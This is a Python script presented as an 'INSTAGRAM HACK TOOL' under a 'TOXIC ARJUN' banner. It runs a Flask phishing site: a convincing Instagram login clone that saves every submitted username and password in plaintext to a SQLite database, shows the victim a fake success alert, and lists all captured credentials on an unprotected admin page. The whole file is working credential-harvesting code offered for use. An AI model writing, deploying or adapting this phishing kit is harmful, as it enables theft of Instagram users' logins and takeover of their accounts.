import requests
import random
import requests
import json
import pyfiglet
import sys
import time
import os
import uuid
import webbrowser
import fake_useragent



Ab = '\033[1;92m'
aB = '\033[1;91m'
AB = '\033[1;96m'
aBbs = '\033[1;93m'
AbBs = '\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("TOXIC ARJUN")
print(a_bSa + ab)


def to(s):
    for char in s + "\n":
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(500.0 / 8000)


to(
    f"\033[31;m Script Type>> \033[1;36mINSTAGRAM HACK TOOL \n\033[1;31m Telegram >>\033[1;33m@Privatearjun\n\033[31;m Creator >>\033[1;33m@CDMAXX\n\033[31;m Tool Status >>\033[1;33mWorking\n\033[31;m Tool Value >>\033[1;33mPaid Script\n\033[31;m Time >>\033[1;33m2 Days\n\033[31;m")
print('')
print('\033[32;m')
from flask import Flask, render_template_string, request
import sqlite3

app = Flask(__name__)

# Function to create a table in the SQLite database (if not already created)
def create_table():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  phone TEXT,
                  username TEXT,
                  password TEXT)''')
    conn.commit()
    conn.close()

# Route for displaying the login page
@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Instagram Login Clone</title>
      <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-gray-50">
      <div class="flex justify-center items-center min-h-screen">
        <!-- Left Section: Phone Mockup -->
        <div class="hidden lg:block">
          <img 
            src="https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png" 
            alt="Instagram Phone Mockup" 
            class="w-[380px] relative">
          <div class="absolute inset-0">
            <img 
              src="https://www.instagram.com/static/images/homepage/screenshot1.jpg/dfd6a93b2b51.jpg" 
              alt="App Screenshot" 
              class="absolute top-[72px] left-[107px] w-[240px] h-[440px]">
          </div>
        </div>

        <!-- Right Section: Login Form -->
        <div class="w-full max-w-sm bg-white p-6 border border-gray-300 rounded-md shadow-sm">
          <!-- Instagram Logo -->
          <div class="flex justify-center mb-6">
            <img 
              src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" 
              alt="Instagram Logo" 
              class="w-[175px]">
          </div>

          <!-- Login Form -->
          <form id="login-form" class="space-y-4" method="POST" action="/submit">
            <input 
              type="text" 
              id="username" 
              name="username" 
              placeholder="Phone number, username, or email" 
              class="w-full px-4 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-1 focus:ring-blue-500"
              required>
      
            <input 
              type="password" 
              id="password" 
              name="password" 
              placeholder="Password" 
              class="w-full px-4 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-1 focus:ring-blue-500"
              required>
            <button 
              type="submit" 
              class="w-full bg-blue-500 text-white font-semibold py-2 rounded-md hover:bg-blue-600 transition">
              Log In
            </button>
          </form>

          <!-- OR Divider -->
          <div class="flex items-center space-x-2 my-4">
            <div class="h-px bg-gray-300 flex-1"></div>
            <p class="text-sm text-gray-500">OR</p>
            <div class="h-px bg-gray-300 flex-1"></div>
          </div>

          <!-- Login with Facebook -->
          <div class="flex justify-center">
            <button class="flex items-center space-x-2 text-blue-700 font-semibold text-sm">
              <img 
                src="https://cdn-icons-png.flaticon.com/512/124/124010.png" 
                alt="Facebook Icon" 
                class="w-5 h-5">
              <span>Log in with Facebook</span>
            </button>
          </div>

          <!-- Forgot Password -->
          <div class="text-center mt-4">
            <a href="#" class="text-xs text-blue-500">Forgot password?</a>
          </div>
        </div>
      </div>
    </body>
    </html>
    ''')

# Route for handling form submission
@app.route('/submit', methods=['POST'])
def submit():
    phone = request.form['username']  # This will get the username or phone number
    username = request.form['username']  # Assuming this is the username
    password = request.form['password']

    # Insert the data into the database
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT INTO users (phone, username, password) VALUES (?, ?, ?)",
              (phone, username, password))
    conn.commit()
    conn.close()

    return '''<script>alert('Login successful!'); window.location.href='/';</script>'''

# Admin panel route to view users
@app.route('/admin')
def admin():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users")
    users = c.fetchall()
    conn.close()

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Admin Panel</title>
      <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-gray-50">
      <div class="container mx-auto py-8">
        <h1 class="text-3xl font-bold mb-6">Admin Panel</h1>
        <div class="overflow-x-auto">
          <table class="min-w-full bg-white border border-gray-300 rounded-lg">
            <thead class="bg-gray-100">
              <tr>
                <th class="py-2 px-4 text-left">ID</th>
                <th class="py-2 px-4 text-left">Phone/Username</th>
                <th class="py-2 px-4 text-left">Username</th>
                <th class="py-2 px-4 text-left">Password</th>
              </tr>
            </thead>
            <tbody>
              {% for user in users %}
              <tr>
                <td class="py-2 px-4">{{ user[0] }}</td>
                <td class="py-2 px-4">{{ user[1] }}</td>
                <td class="py-2 px-4">{{ user[2] }}</td>
                <td class="py-2 px-4">{{ user[3] }}</td>
              </tr>
              {% endfor %}
            </tbody>
          </table>
        </div>
      </div>
    </body>
    </html>
    ''', users=users)

if __name__ == '__main__':
    create_table()  # Ensure the table exists before the app runs
    app.run(debug=True)